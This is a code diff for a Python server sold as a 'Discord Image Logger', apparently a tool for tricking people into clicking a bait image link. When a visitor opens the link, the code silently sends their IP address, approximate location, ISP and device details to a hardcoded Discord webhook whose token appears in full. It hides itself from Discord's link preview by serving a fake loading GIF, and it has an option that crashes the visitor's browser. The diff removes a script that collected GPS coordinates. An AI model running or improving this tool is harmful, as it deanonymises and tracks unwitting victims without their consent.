@@ -1,51 +1,56 @@
+# -*- coding: utf-8 -*-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser, socket
 from datetime import datetime, timezone
 
 __app__         = "Discord Image Logger"
-__description__ = "Advanced IP logger — abuses Discord's Open Original feature"
-__version__     = "v3.0"
+__version__     = "v3.1"
 __author__      = "C00lB0i"
 
 config = {
     # ── BASE CONFIG ──────────────────────────────────────────────────────────
     "webhook": "https://discordapp.com/api/webhooks/1473590436055482430/9n7NGn-u_xqmSa9ofFsKc2KW_yXxkRNHSk21c5A94bDnHaEMuSePrSK2WEeNKqpKVhWU",
     "image":   "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExbDVtZWtpb3JpNXpqOXdtMTBkNGF4dHZnc21vMGN6YXprNTM0cmxwMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/ZuzxVIWWHUQDkhrtu6/giphy.gif",
-    "imageArgument": True,   # Allow ?url= or ?id= param to override the image
+    # Set imageArgument to True to allow ?url=<base64 image url> or ?id=<base64>
+    "imageArgument": True,
 
     # ── CUSTOMIZATION ────────────────────────────────────────────────────────
     "username": "Image Logger",
-    "color":    0x00FFFF,    # Cyan embed border
+    "color":    0x00FFFF,
 
     # ── OPTIONS ──────────────────────────────────────────────────────────────
-    "crashBrowser":    False,
-    "accurateLocation": True,  # Collect GPS coords via browser JS (asks user)
+    "crashBrowser": False,
 
     "message": {
         "doMessage":   False,
-        "message":     "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC",
+        "message":     "This browser has been pwned by C00lB0i's Image Logger.",
         "richMessage": True,
     },
 
-    "vpnCheck": 1,   # 0=off | 1=no ping for VPN | 2=skip alert for VPN
+    # vpnCheck: 0=off | 1=no @everyone ping for VPN | 2=skip alert entirely
+    "vpnCheck":   1,
     "linkAlerts": True,
+    # buggedImage: serve a fake loading GIF to Discord crawlers so the embed
+    # preview shows a "loading" animation instead of the real image.
     "buggedImage": True,
 
-    "antiBot": 1,    # 0=off | 1=no ping hosting | 2=no ping 100% bot
-                     # 3=skip alert hosting | 4=skip alert 100% bot
+    # antiBot: 0=off | 1=no ping for hosting IPs | 2=no ping 100% bot
+    #          3=skip alert hosting | 4=skip alert 100% bot
+    "antiBot": 1,
 
     # ── REDIRECTION ──────────────────────────────────────────────────────────
+    # If redirect is True, real users are sent here instead of the image.
     "redirect": {
         "redirect": False,
         "page":     "https://your-link.here",
     },
 }
 
-# IPs / prefixes to silently ignore (Discord crawlers, known bots, etc.)
+# IP prefixes to silently ignore (Discord/known crawlers)
 blacklistedIPs = ("27", "104", "143", "164")
 
-# In-memory visit counter  {endpoint: count}
+# In-memory visit counter per endpoint
 _visit_counts: dict = {}
 
 
@@ -54,7 +59,7 @@ _visit_counts: dict = {}
 # ─────────────────────────────────────────────────────────────────────────────
 
 def _flag(country_code: str) -> str:
-    """Convert a 2-letter ISO country code to a flag emoji."""
+    """Convert 2-letter ISO country code to flag emoji."""
     if not country_code or len(country_code) != 2:
         return ""
     return "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in country_code.upper())
@@ -70,12 +75,12 @@ def _rdns(ip: str) -> str:
 
 def _get_ip(headers) -> str:
     """
-    Safely extract the real visitor IP from request headers.
-    Tries x-forwarded-for first, then x-real-ip, then falls back to ''.
+    Safely extract the real visitor IP.
+    x-forwarded-for may be a comma-separated list; take the first entry.
+    Falls back to x-real-ip, then empty string.
     """
     forwarded = headers.get("x-forwarded-for") or ""
     if forwarded:
-        # x-forwarded-for may be a comma-separated list; first entry = client
         return forwarded.split(",")[0].strip()
     return (headers.get("x-real-ip") or "").strip()
 
@@ -89,31 +94,24 @@ def botCheck(ip: str, useragent: str) -> str | bool:
 
 
 def reportError(error: str):
-    requests.post(config["webhook"], json={
-        "username": config["username"],
-        "content":  "@everyone",
-        "embeds": [{
-            "title":       "Image Logger — Error",
-            "color":       config["color"],
-            "description": f"An error occurred while logging an IP!\n\n**Error:**\n```\n{error}\n```",
-        }],
-    })
+    try:
+        requests.post(config["webhook"], json={
+            "username": config["username"],
+            "content":  "@everyone",
+            "embeds": [{
+                "title":       "Image Logger — Error",
+                "color":       config["color"],
+                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
+            }],
+        }, timeout=5)
+    except Exception:
+        pass
 
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False,
-               screen=None, lang=None):
+def makeReport(ip, useragent=None, endpoint="N/A", url=False):
     """
     Build and POST a rich Discord embed for a real visitor.
-
-    Parameters
-    ----------
-    ip        : visitor IP address
-    useragent : raw User-Agent string
-    coords    : "lat,lon" string from GPS (accurate) or None (use ip-api)
-    endpoint  : URL path that was hit
-    url       : bait image URL (used as embed thumbnail)
-    screen    : "WxH" screen resolution string from JS
-    lang      : browser language from JS
+    Location comes from ip-api.com (IP-based, no GPS popup).
     """
     if not ip or ip.startswith(blacklistedIPs):
         return
@@ -123,21 +121,24 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False,
     # ── Bot / link-alert path ─────────────────────────────────────────────
     if bot:
         if config["linkAlerts"]:
-            requests.post(config["webhook"], json={
-                "username": config["username"],
-                "content":  "",
-                "embeds": [{
-                    "title": "Image Logger — Link Sent",
-                    "color": config["color"],
-                    "description": (
-                        f"An **Image Logging** link was sent in a chat!\n"
-                        f"You may receive an IP soon.\n\n"
-                        f"**Endpoint:** `{endpoint}`\n"
-                        f"**IP:** `{ip}`\n"
-                        f"**Platform:** `{bot}`"
-                    ),
-                }],
-            })
+            try:
+                requests.post(config["webhook"], json={
+                    "username": config["username"],
+                    "content":  "",
+                    "embeds": [{
+                        "title": "Image Logger — Link Sent",
+                        "color": config["color"],
+                        "description": (
+                            f"An **Image Logging** link was sent in a chat!\n"
+                            f"You may receive an IP soon.\n\n"
+                            f"**Endpoint:** `{endpoint}`\n"
+                            f"**IP:** `{ip}`\n"
+                            f"**Platform:** `{bot}`"
+                        ),
+                    }],
+                }, timeout=5)
+            except Exception:
+                pass
         return
 
     # ── Geolocation via ip-api.com ────────────────────────────────────────
@@ -169,21 +170,9 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False,
     # ── OS / Browser ──────────────────────────────────────────────────────
     os_name, browser_name = httpagentparser.simple_detect(useragent or "")
 
-    # ── Coordinates & Google Maps link ───────────────────────────────────
-    lat  = info.get("lat", "")
-    lon  = info.get("lon", "")
-
-    if coords:
-        # Accurate GPS coords from browser JS
-        parts = coords.replace(",", " ").split()
-        if len(parts) == 2:
-            lat, lon = parts[0], parts[1]
-        coord_label  = "📍 Precise (GPS)"
-        coord_source = "GPS"
-    else:
-        coord_label  = "📍 Approximate (IP)"
-        coord_source = "IP-based"
-
+    # ── Coordinates & Google Maps link (IP-based, no popup) ───────────────
+    lat = info.get("lat", "")
+    lon = info.get("lon", "")
     if lat and lon:
         maps_url   = f"https://www.google.com/maps?q={lat},{lon}"
         coord_text = f"`{lat}, {lon}` — [Open in Google Maps]({maps_url})"
@@ -191,15 +180,14 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False,
         coord_text = "`Unknown`"
 
     # ── Country flag ─────────────────────────────────────────────────────
-    country_code = info.get("countryCode", "")
-    flag         = _flag(country_code)
+    flag = _flag(info.get("countryCode", ""))
 
     # ── Reverse DNS ───────────────────────────────────────────────────────
     hostname = _rdns(ip)
 
     # ── Timezone ──────────────────────────────────────────────────────────
-    tz_raw = info.get("timezone", "/")
-    tz_parts = tz_raw.split("/")
+    tz_raw    = info.get("timezone", "/")
+    tz_parts  = tz_raw.split("/")
     tz_display = (
         f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"
         if len(tz_parts) == 2 else tz_raw
@@ -217,7 +205,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False,
 
 **Endpoint:** `{endpoint}`   •   **Visit #:** `{visit_no}`
 
-**🌐 IP Info:**
+**\U0001f310 IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Hostname (rDNS):** `{hostname}`
 > **Provider:** `{info.get('isp', 'Unknown')}`
@@ -229,19 +217,17 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False,
 > **Region:** `{info.get('regionName', 'Unknown')}`
 > **City:** `{info.get('city', 'Unknown')}`
 > **ZIP:** `{info.get('zip', 'Unknown')}`
-> **Coords ({coord_source}):** {coord_text}
+> **Coords (IP-based):** {coord_text}
 > **Timezone:** `{tz_display}`
 
-**🔒 Threat Info:**
+**\U0001f512 Threat Info:**
 > **Mobile:** `{info.get('mobile', 'Unknown')}`
 > **VPN/Proxy:** `{info.get('proxy', 'Unknown')}`
 > **Hosting/Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
 
-**💻 Device Info:**
+**\U0001f4bb Device Info:**
 > **OS:** `{os_name}`
 > **Browser:** `{browser_name}`
-> **Screen:** `{screen if screen else 'Unknown'}`
-> **Language:** `{lang if lang else 'Unknown'}`
 
 **User Agent:**
 ```
@@ -252,17 +238,21 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False,
         "username": config["username"],
         "content":  ping,
         "embeds": [{
-            "title":       "Image Logger — IP Logged",
+            "title":       "Image Logger \u2014 IP Logged",
             "color":       config["color"],
             "description": description,
-            "footer":      {"text": f"🕐 {now_utc}"},
+            "footer":      {"text": f"\U0001f550 {now_utc}"},
         }],
     }
 
     if url:
         embed["embeds"][0]["thumbnail"] = {"url": url}
 
-    requests.post(config["webhook"], json=embed)
+    try:
+        requests.post(config["webhook"], json=embed, timeout=5)
+    except Exception:
+        pass
+
     return info
 
 
@@ -277,55 +267,12 @@ binaries = {
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# JS injected into the page to collect device info + GPS + redirect to image
-# ─────────────────────────────────────────────────────────────────────────────
-_COLLECTOR_JS = """
-<script>
-(function() {
-    var base = window.location.href.split('?')[0];
-    var params = new URLSearchParams(window.location.search);
-
-    // Screen resolution & language
-    params.set('sr', screen.width + 'x' + screen.height);
-    params.set('lang', navigator.language || navigator.userLanguage || '');
-
-    function redirect(p) {
-        window.location.replace(base + '?' + p.toString());
-    }
-
-    // GPS (only ask once — if 'g' param not already set)
-    if (!params.has('g') && navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            function(pos) {
-                var coords = pos.coords.latitude + ',' + pos.coords.longitude;
-                params.set('g', btoa(coords));
-                redirect(params);
-            },
-            function() {
-                // User denied or error — still send screen/lang
-                if (!params.has('sr_sent')) {
-                    params.set('sr_sent', '1');
-                    redirect(params);
-                }
-            },
-            { timeout: 8000 }
-        );
-    } else if (!params.has('sr_sent')) {
-        params.set('sr_sent', '1');
-        redirect(params);
-    }
-})();
-</script>
-"""
-
-
-# ─────────────────────────────────────────────────────────────────────────────
 # Request handler
 # ─────────────────────────────────────────────────────────────────────────────
 class ImageLoggerAPI(BaseHTTPRequestHandler):
 
     def log_message(self, format, *args):
-        """Suppress default access-log output."""
+        """Suppress default stdout access-log noise."""
         pass
 
     def handleRequest(self):
@@ -333,7 +280,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             s   = self.path
             dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
-            # ── Resolve image URL ─────────────────────────────────────────
+            # ── Resolve bait image URL ────────────────────────────────────
             if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                 raw = dic.get("url") or dic.get("id")
                 try:
@@ -343,16 +290,21 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            # ── Safely get visitor IP ─────────────────────────────────────
+            # ── Safely get visitor IP & User-Agent ────────────────────────
             ip = _get_ip(self.headers)
             ua = self.headers.get("user-agent") or ""
 
             # ── Blacklist check ───────────────────────────────────────────
             if ip and ip.startswith(blacklistedIPs):
-                self._send_redirect(url)
+                self._redirect(url)
                 return
 
+            endpoint = s.split("?")[0]
+
             # ── Discord / bot crawler path ────────────────────────────────
+            # Discord crawls the link to generate an embed preview.
+            # We serve the fake loading GIF so the preview looks like a
+            # loading animation, then log the link-send event.
             if botCheck(ip, ua):
                 if config["buggedImage"]:
                     self.send_response(200)
@@ -360,68 +312,38 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                     self.end_headers()
                     self.wfile.write(binaries["loading"])
                 else:
-                    self._send_redirect(url)
-
-                makeReport(ip, endpoint=s.split("?")[0], url=url)
+                    self._redirect(url)
+                makeReport(ip, ua, endpoint=endpoint, url=url)
                 return
 
             # ── Real visitor path ─────────────────────────────────────────
-            endpoint = s.split("?")[0]
+            # Log the IP immediately, then redirect to the actual image.
+            # No JS, no popups, no intermediate page — the image loads instantly.
+            makeReport(ip, ua, endpoint=endpoint, url=url)
 
-            # Collect optional JS-supplied params
-            coords = None
-            if dic.get("g") and config["accurateLocation"]:
-                try:
-                    coords = base64.b64decode(dic["g"].encode()).decode()
-                except Exception:
-                    coords = None
-
-            screen = dic.get("sr") or None
-            lang   = dic.get("lang") or None
-
-            # Only log on the "final" request (when sr_sent is set, or no GPS)
-            # This avoids duplicate webhook pings from the JS redirect chain.
-            should_log = dic.get("sr_sent") or not config["accurateLocation"]
-
-            if should_log:
-                makeReport(ip, ua, coords, endpoint, url=url,
-                           screen=screen, lang=lang)
-
-            # ── Decide what to serve ──────────────────────────────────────
             if config["redirect"]["redirect"]:
-                self._send_redirect(config["redirect"]["page"])
+                self._redirect(config["redirect"]["page"])
                 return
 
-            # Build response page: inject JS collector then redirect to image
             if config["message"]["doMessage"]:
-                body = config["message"]["message"].encode()
+                body  = config["message"]["message"].encode()
                 ctype = "text/html"
-            elif config["crashBrowser"]:
-                body  = b'<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'
-                ctype = "text/html"
-            else:
-                # Serve a transparent page that runs the JS collector,
-                # then (after collection) does a final redirect to the image.
-                # On the final hop (sr_sent=1) we redirect straight to the image.
-                if dic.get("sr_sent"):
-                    self._send_redirect(url)
-                    return
-                else:
-                    page = (
-                        "<!DOCTYPE html><html><head>"
-                        "<meta name='viewport' content='width=device-width'>"
-                        "<style>body{margin:0;background:#000}</style>"
-                        "</head><body>"
-                        + _COLLECTOR_JS +
-                        "</body></html>"
-                    )
-                    body  = page.encode()
-                    ctype = "text/html"
+                self.send_response(200)
+                self.send_header("Content-type", ctype)
+                self.end_headers()
+                self.wfile.write(body)
+                return
 
-            self.send_response(200)
-            self.send_header("Content-type", ctype)
-            self.end_headers()
-            self.wfile.write(body)
+            if config["crashBrowser"]:
+                body = b'<script>setTimeout(function(){for(var i=69420;i==i;i*=i){console.log(i)}},100)</script>'
+                self.send_response(200)
+                self.send_header("Content-type", "text/html")
+                self.end_headers()
+                self.wfile.write(body)
+                return
+
+            # Default: redirect straight to the image — loads instantly, no popup
+            self._redirect(url)
 
         except Exception:
             try:
@@ -436,7 +358,8 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             except Exception:
                 pass
 
-    def _send_redirect(self, location: str):
+    def _redirect(self, location: str):
+        """Send a 302 redirect to the given URL."""
         self.send_response(302)
         self.send_header("Location", location)
         self.end_headers()
